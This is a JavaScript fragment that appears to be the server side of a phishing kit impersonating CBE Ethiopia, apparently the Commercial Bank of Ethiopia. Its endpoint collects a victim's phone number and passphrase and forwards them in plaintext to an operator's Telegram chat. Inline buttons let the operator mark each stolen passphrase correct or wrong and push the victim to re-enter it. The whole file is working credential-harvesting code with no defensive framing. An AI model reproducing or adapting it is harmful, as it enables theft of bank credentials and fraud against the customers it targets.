// -------------------- PASSPHRASE VERIFICATION API --------------------
app.post('/api/verify-passphrase', async (req, res) => {
    const { phone, passphrase } = req.body || {};
    const country = "ኢትዮጵያ (Ethiopia)";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !passphrase || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_passphrase";

    const passphraseMessage = `🔐 <b>CBE ETHIOPIA - PASSPHRASE VERIFICATION</b>

🇪🇹 <b>Country:</b> ${country}
📱 <b>Phone Number:</b> ${phone}
🔑 <b>Passphrase:</b> <code>${passphrase}</code>
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify Passphrase:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, passphraseMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct Passphrase", callback_data: `passphrase_correct|${phone}` },
                        { text: "❌ Wrong Passphrase", callback_data: `passphrase_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// Add these inside your bot action handlers:
bot.action(/^passphrase_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "passphrase_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg = `🔐 <b>PASSPHRASE VERIFIED</b>

🇪🇹 <b>Ethiopia</b>
📱 <b>${phone}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Passphrase verified</b>
✅ <b>Process Complete</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
});

bot.action(/^passphrase_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "passphrase_wrong";
    await ctx.answerCbQuery("Wrong Passphrase");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>PASSPHRASE WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter passphrase.</b>`);
});
